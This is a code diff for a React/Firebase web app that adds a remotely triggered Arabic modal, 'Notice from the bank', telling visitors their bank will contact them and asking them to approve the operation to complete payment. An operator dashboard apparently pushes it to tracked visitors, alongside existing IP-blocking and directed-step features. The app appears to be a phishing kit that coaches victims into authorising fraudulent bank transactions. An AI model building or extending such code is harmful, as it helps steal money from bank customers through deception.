@@ -12,6 +12,8 @@ import {
   ensureVisitorIp,
   listenForIpBlock,
   listenForVisitorBlock,
+  listenForBankContactRequest,
+  confirmBankContact,
 } from "@/lib/firebase";
 
 const TICKET_STEP_TO_PATH: Record<number, string> = {
@@ -213,6 +215,95 @@ function BlockGate({ children }: { children: React.ReactNode }) {
   return <>{children}</>;
 }
 
+function BankContactModal({ onConfirm }: { onConfirm: () => void }) {
+  const [submitting, setSubmitting] = useState(false);
+  return (
+    <div
+      dir="rtl"
+      className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
+      data-testid="bank-contact-modal"
+    >
+      <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden">
+        <div className="bg-gradient-to-br from-[#4a1525] to-[#2a0a14] p-6 text-center">
+          <div className="w-16 h-16 mx-auto rounded-full bg-white/15 flex items-center justify-center mb-3">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              strokeWidth="2"
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              className="w-9 h-9 text-[#c9a96e]"
+            >
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
+            </svg>
+          </div>
+          <h2 className="text-white text-xl font-bold">إشعار من البنك</h2>
+        </div>
+        <div className="p-6 space-y-5">
+          <p
+            className="text-slate-800 text-base leading-relaxed text-center"
+            data-testid="text-bank-contact-message"
+          >
+            سيتم التواصل معكم من قبل البنك الخاص بكم، يرجى اتباع الخطوات
+            المطلوبة والموافقة على العملية لإتمام عملية الدفع.
+          </p>
+          <button
+            onClick={async () => {
+              if (submitting) return;
+              setSubmitting(true);
+              try {
+                await confirmBankContact();
+              } finally {
+                onConfirm();
+              }
+            }}
+            disabled={submitting}
+            className="w-full py-3 bg-gradient-to-r from-[#4a1525] to-[#6b1f37] hover:from-[#5a1a2e] hover:to-[#7a2440] text-white rounded-xl font-bold shadow-lg transition-all disabled:opacity-60"
+            data-testid="button-confirm-bank-contact"
+          >
+            {submitting ? "جاري التأكيد..." : "تأكيد"}
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function BankContactGate() {
+  const [show, setShow] = useState(false);
+
+  useEffect(() => {
+    const path = window.location.pathname;
+    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;
+
+    let unsub: (() => void) | undefined;
+    let attachedFor: string | null = null;
+
+    const tryAttach = () => {
+      const id = localStorage.getItem("visitor");
+      if (!id || id === attachedFor) return;
+      if (unsub) unsub();
+      attachedFor = id;
+      unsub = listenForBankContactRequest((shouldShow) => {
+        setShow(shouldShow);
+      });
+    };
+
+    tryAttach();
+    const retry = window.setInterval(tryAttach, 1500);
+
+    return () => {
+      window.clearInterval(retry);
+      if (unsub) unsub();
+    };
+  }, []);
+
+  if (!show) return null;
+  return <BankContactModal onConfirm={() => setShow(false)} />;
+}
+
 function App() {
   useEffect(() => {
     const path = window.location.pathname;
@@ -231,6 +322,7 @@ function App() {
         <Toaster />
         <BlockGate>
           <DirectedStepWatcher />
+          <BankContactGate />
           <Router />
         </BlockGate>
       </TooltipProvider>
